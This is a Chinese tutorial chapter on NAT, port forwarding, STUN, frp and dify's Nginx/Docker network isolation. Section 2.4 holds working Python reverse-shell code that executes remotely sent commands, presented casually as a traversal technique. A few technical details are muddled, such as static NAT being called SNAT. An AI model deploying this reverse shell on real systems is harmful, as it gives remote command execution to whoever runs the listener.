# 4.4.4 NAT 与内网穿透

> NAT 是 IPv4 地址不足的解决方案，也是内网穿透的基础。

## 🎯 学习目标

完成本文档后，你将能够：
- 理解 NAT 的工作原理
- 区分不同类型的 NAT
- 知道内网穿透的实现方式
- 能在 dify 中识别 NAT 的应用

## 📚 前置知识

- 16-ip-subnet.md

## 1. 核心概念

### 1.1 什么是 NAT？

**NAT（Network Address Translation）**：把私有 IP 转换为公网 IP 的技术。

**为什么需要？**
- IPv4 地址不足
- 多个内网设备共享一个公网 IP
- 隐藏内部网络结构

### 1.2 NAT 的工作原理

```
内网设备              NAT 网关              公网服务器
192.168.1.100        公网 IP 8.8.8.8       93.184.216.34
   │                      │                       │
   ├── 目的 93.184.216.34:80 ──→ │ 转换：            │
   │    源 192.168.1.100:5000 │ 源 = 8.8.8.8:3000    │
   │                          │ ───────────────────→ │
   │                          │                       │
   │←────── 响应 ─────────────│ 转换：                │
   │    目的 8.8.8.8:3000   │ 目的 = 192.168.1.100 │
   │                          │ ←─────────────────── │
```

**NAT 表**：
```
内网 IP:Port         公网 IP:Port
192.168.1.100:5000   8.8.8.8:3000
192.168.1.101:5001   8.8.8.8:3001
```

### 1.3 NAT 的分类

#### 静态 NAT（SNAT）

1 对 1 映射，公网 IP 固定。

```
192.168.1.100  ←→  8.8.8.8:100
192.168.1.101  ←→  8.8.8.8:101
```

#### 动态 NAT

公网 IP 池，动态分配。

#### 端口地址转换（PAT / NAPT）

**最常用**，多对 1 映射（共享 IP，靠端口区分）。

```
192.168.1.100:5000  →  8.8.8.8:30000
192.168.1.100:5001  →  8.8.8.8:30001
192.168.1.101:5000  →  8.8.8.8:30002
```

**家用路由器都用 PAT**。

### 1.4 NAT 的问题

**问题 1：内网无法被外部主动访问**
- 服务器在 NAT 内，外部无法主动连接

**问题 2：部分协议不兼容**
- FTP（主动模式）
- P2P（无法直连）
- IPsec

### 1.5 NAT 穿透（NAT Traversal）

**技术 1：端口转发（Port Forwarding）**

```
路由器配置：
外部 8.8.8.8:8080 → 内网 192.168.1.100:80
```

**技术 2：UPnP**

自动配置端口转发。

**技术 3：NAT 穿透协议**

- **STUN**：发现自己的公网 IP/端口
- **TURN**：流量中继（兜底）
- **ICE**：综合 STUN + TURN

**技术 4：反向代理**

服务器在 NAT 内，主动连出到有公网 IP 的代理。

```
内网服务器 → 中转服务器（有公网 IP）→ 客户端
```

### 1.6 内网穿透工具

| 工具 | 特点 |
|------|------|
| **frp** | 开源、高性能、支持多种协议 |
| **ngrok** | 简单、有免费版 |
| **cpolar** | 国内常用 |
| **tailscale** | 基于 WireGuard，零配置 |
| **zerotier** | 类似 tailscale |

## 2. 代码示例

### 2.1 STUN 客户端（发现公网 IP）

```python
# 文件：stun_demo.py
import socket
import struct

def stun_query():
    """用 STUN 协议查询公网 IP。"""
    # Google STUN 服务器
    STUN_HOST = "stun.l.google.com"
    STUN_PORT = 19302

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)

    # STUN Binding Request
    # 类型 0x0001，长度 0，魔术 cookie 0x2112A442
    request = struct.pack("!HHI12s",
        0x0001,  # Binding Request
        0,        # Length
        0x2112A442,  # Magic Cookie
        b"\x00" * 12,  # Transaction ID
    )

    sock.sendto(request, (STUN_HOST, STUN_PORT))
    response, _ = sock.recvfrom(4096)

    # 解析响应（简化）
    # ... 实际需要解析 STUN 响应格式
    print(f"响应长度: {len(response)} bytes")
```

### 2.2 frp 客户端配置示例

```ini
# 文件：frpc.ini（frp 客户端配置）
[common]
server_addr = frp.example.com
server_port = 7000
token = your_token_here

[dify_web]
type = tcp
local_ip = 127.0.0.1
local_port = 3000
remote_port = 8080

[dify_ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
```

### 2.3 简单的端口转发

```python
# 文件：port_forward.py
import socket
import threading

def forward_data(src, dst):
    """把 src 的数据转发到 dst。"""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except Exception:
        pass
    finally:
        src.close()
        dst.close()

def port_forward(listen_port: int, target_host: str, target_port: int):
    """简单的 TCP 端口转发。"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", listen_port))
    server.listen()
    print(f"转发 {listen_port} → {target_host}:{target_port}")

    while True:
        client, addr = server.accept()
        print(f"连接: {addr}")

        # 连接目标
        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target.connect((target_host, target_port))

        # 双向转发
        threading.Thread(target=forward_data, args=(client, target), daemon=True).start()
        threading.Thread(target=forward_data, args=(target, client), daemon=True).start()

# port_forward(8080, "192.168.1.100", 80)
```

### 2.4 反向 Shell（NAT 穿透）

```python
# 文件：reverse_shell.py
import socket
import subprocess

def reverse_shell_client(server_host: str, server_port: int):
    """反向 shell 客户端（被控端）。"""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_host, server_port))

    while True:
        # 接收命令
        cmd = client.recv(1024).decode()
        if not cmd or cmd.lower() == "exit":
            break
        # 执行命令
        try:
            output = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT
            )
        except subprocess.CalledProcessError as e:
            output = e.output
        # 返回结果
        client.send(output)

def reverse_shell_server(listen_port: int):
    """反向 shell 服务端（控制端）。"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", listen_port))
    server.listen()

    while True:
        client, addr = server.accept()
        print(f"被控端连接: {addr}")
        # 发送命令交互
        # ...
```

## 3. dify 仓库源码解读

### 3.1 dify 的网络部署（NAT 场景）

**文件位置**：`/Users/xu/code/github/dify/docker/nginx/conf.d/default.conf`
**核心代码**（简化）：

```nginx
# dify 的 Nginx 反向代理配置

# 反向代理 dify API
location /v1/ {
    proxy_pass http://api:5001/v1/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}

# 反向代理 dify Web
location / {
    proxy_pass http://web:3000/;
}

# 流式响应（重要：禁用缓冲）
location /v1/chat-messages {
    proxy_pass http://api:5001/v1/chat-messages;
    proxy_buffering off;       # 禁用缓冲（流式响应必需）
    proxy_cache off;            # 禁用缓存
    proxy_set_header Connection '';
    proxy_http_version 1.1;     # HTTP/1.1 支持 keep-alive
    chunked_transfer_encoding on;
}
```

**解读**：
- 第 6-9 行：反向代理到内部服务（API、Web）
- 第 17-22 行：流式响应需要禁用缓冲
- **设计意图**：用 Nginx 做反向代理，统一入口 + 负载均衡

### 3.2 dify 的部署网络拓扑

**文件位置**：`/Users/xu/code/github/dify/docker/docker-compose.yaml`
**核心代码**（简化）：

```yaml
# dify 的 docker-compose 服务

services:
  # 反向代理（Nginx）
  nginx:
    image: nginx
    ports:
      - "80:80"           # 暴露 80 端口到公网
      - "443:443"
    networks:
      - dify-network

  # API 服务（内网）
  api:
    image: dify-api
    expose:
      - "5001"            # 只暴露到内网，不暴露到公网
    networks:
      - dify-network

  # PostgreSQL（内网）
  db:
    image: postgres
    expose:
      - "5432"            # 只内网访问
    networks:
      - dify-network

  # Redis（内网）
  redis:
    image: redis
    expose:
      - "6379"            # 只内网访问
    networks:
      - dify-network
```

**解读**：
- 第 6 行：Nginx 暴露公网端口（80、443）
- 第 15、24、33 行：其他服务只内网访问（用 `expose` 而非 `ports`）
- **网络隔离**：外部只能访问 Nginx，内部服务互相通信

## 4. 关键要点总结

- **NAT**：私有 IP ↔ 公网 IP 转换
- **PAT**：多对一映射（家用路由器）
- **NAT 穿透**：端口转发、frp、反向代理
- **frp**：常用内网穿透工具
- dify 用 Nginx 反向代理 + Docker 网络隔离

## 5. 练习题

### 练习 1：基础（必做）

用 Python 写一个简单的端口转发脚本（listen_port → target_port）。

### 练习 2：进阶

阅读 `docker/docker-compose.yaml`，说明 dify 为何用 `expose` 而非 `ports` 暴露内部服务。

### 练习 3：挑战（选做）

部署 frp 服务器和客户端，从公网访问内网的 Web 服务。

## 6. 参考资料

- `/Users/xu/code/github/dify/docker/docker-compose.yaml`
- `/Users/xu/code/github/dify/docker/nginx/conf.d/default.conf`
- RFC 2663：NAT
- frp：https://github.com/fatedier/frp

---

**文档版本**：v1.0
**最后更新**：2026-07-13